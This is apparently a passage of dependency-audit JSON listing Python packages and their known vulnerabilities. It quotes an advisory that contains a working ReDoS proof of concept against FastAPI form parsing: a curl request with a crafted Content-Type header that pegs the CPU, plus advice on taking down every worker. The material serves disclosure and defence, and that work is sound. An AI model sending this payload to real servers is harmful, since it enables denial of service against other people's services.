My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).  Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:  ```Python from typing import Annotated from fastapi.responses import HTMLResponse from fastapi import FastAPI,Form from pydantic import BaseModel  class Item(BaseModel):     username: str  app = FastAPI()  @app.get(\"/\", response_class=HTMLResponse) async def index():     return HTMLResponse(\"Test\", status_code=200)  @app.post(\"/submit/\") async def submit(username: Annotated[str, Form()]):     return {\"username\": username}  @app.post(\"/submit_json/\") async def submit_json(item: Item):     return {\"username\": item.username} ```  I'm running the above with uvicorn with the following command:  ```console uvicorn server:app ```  Then run the following cUrl command:  ``` curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/' ```  You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%  You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.  If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.  Cheers  #### Impact  An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.  #### Occurrences  [params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)  </details>"}, {"id": "GHSA-59g5-xgcq-4qw3", "fix_versions": ["0.0.18"], "aliases": ["CVE-2024-53981"], "description": "### Summary  When parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary.

An attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).  ### Impact  Applications that use `python-multipart` to parse form data (or use frameworks that do so) are affected.   ### Original Report  This security issue was reported by: - GitHub security advisory in Starlette on October 30 by @Startr4ck - Email to `python-multipart` maintainer on October 3 by @mnqazi"}]}, {"name": "python-json-logger", "version": "2.0.7", "vulns": []}, {"name": "validators", "version": "0.22.0", "vulns": []}, {"name": "python-dateutil", "version": "2.8.2", "vulns": []}, {"name": "email-validator", "version": "2.1.0", "vulns": []}, {"name": "redis", "version": "5.0.1", "vulns": []}, {"name": "hiredis", "version": "2.3.2", "vulns": []}, {"name": "aiofiles", "version": "23.2.1", "vulns": []}, {"name": "bcrypt", "version": "4.0.1", "vulns": []}, {"name": "passlib", "version": "1.7.4", "vulns": []}, {"name": "python-jose", "version": "3.3.0", "vulns": [{"id": "PYSEC-2024-232", "fix_versions": ["3.4.0"], "aliases": ["CVE-2024-33663"], "description": "python-jose through 3.3.0 has algorithm confusion with OpenSSH ECDSA keys and other key formats.

Using the `ecdsa.SigningKey.sign_digest()` API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix."}]}, {"name": "greenlet", "version": "3.2.4", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "httptools", "version": "0.7.1", "vulns": []}, {"name": "limits", "version": "5.6.0", "vulns": []}, {"name": "deprecated", "version": "1.3.1", "vulns": []}, {"name": "wrapt", "version": "2.0.0", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "packaging", "version": "25.0", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "platformdirs", "version": "4.5.0", "vulns": []}, {"name": "pyyaml", "version": "6.0.3", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "soupsieve", "version": "2.8", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "tzlocal", "version": "5.3.1", "vulns": []}, {"name": "uvloop", "version": "0.22.1", "vulns": []}, {"name": "watchfiles", "version": "1.1.1", "vulns": []}, {"name": "websockets", "version": "15.0.1", "vulns": []}, {"name": "iniconfig", "version": "2.3.0", "vulns": []}, {"name": "mako", "version": "1.3.10", "vulns": []}, {"name": "markupsafe", "version": "3.0.3", "vulns": []}, {"name": "pyasn1", "version": "0.6.1", "vulns": []}, {"name": "pycparser", "version": "2.23", "vulns": []}, {"name": "pytz", "version": "2025.2", "vulns": []}, {"name": "rsa", "version": "4.9.1", "vulns": []}, {"name": "types-html5lib", "version": "1.1.11.20251014", "vulns": []}], "fixes": []}
